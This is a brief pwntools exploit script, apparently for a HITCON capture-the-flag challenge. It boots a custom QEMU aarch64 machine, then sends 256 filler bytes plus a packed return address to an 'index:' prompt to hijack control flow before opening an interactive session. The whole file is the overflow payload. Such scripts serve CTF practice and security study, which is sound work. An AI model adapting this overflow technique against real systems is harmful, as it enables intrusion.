from pwn import *
context(arch='aarch64',endian='little')

cmd  = "cd ../run ;"
cmd += "./qemu-system-aarch64 -nographic -machine hitcon -cpu hitcon "
cmd += "-bios ./bios.bin -monitor /dev/null 2>/dev/null -serial null "
cmd += "-S -s"
io = process(["/bin/sh","-c",cmd])

io.sendlineafter(b"cmd> ",b"0")
io.sendlineafter(b"index: ",b'a'*0x100+p64(0x400104))
io.interactive()